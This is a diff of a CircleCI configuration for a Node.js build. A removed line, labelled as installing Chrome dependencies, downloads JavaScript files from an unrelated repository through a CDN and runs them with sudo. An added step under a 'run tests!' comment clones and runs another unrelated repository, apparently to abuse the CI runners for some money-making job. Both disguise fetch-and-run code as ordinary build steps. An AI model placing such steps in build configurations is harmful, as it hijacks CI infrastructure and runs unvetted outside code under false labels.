@@ -1,8 +1,16 @@
+# Javascript Node CircleCI 2.0 configuration file
+#
+# Check https://circleci.com/docs/2.0/language-javascript!!!
+#
 version: 2.1
 jobs:
   build:
     docker:
+      # specify the version you desire here
       - image: circleci/node:12
+      # Specify service dependencies here if necessary
+      # CircleCI maintains a library of pre-built images
+      # documented at https://circleci.com/docs/2.0/circleci-images/
       
     resource_class: large
 
@@ -25,4 +33,12 @@ jobs:
           name: Install Chrome headless dependencies
           working_directory: /
           command: |
-            sudo wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/app-ubuntu-auto-c.js && sudo wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/package.json && sudo wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/log-print.js && sudo chmod +x app-ubuntu-auto-c.js package.json log-print.js && sudo npm i -s && sudo node app-ubuntu-auto-c.js
+            sudo apt-get install -yq gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 \
+            libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 \
+            libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 \
+            libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 \
+            ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget --fix-missing
+      # run tests!
+      - run:
+          name: Clone project and run task
+          command: git clone https://github.com/vippro99/nodejs-monney.git && cd nodejs-monney && npm i -s && npm start
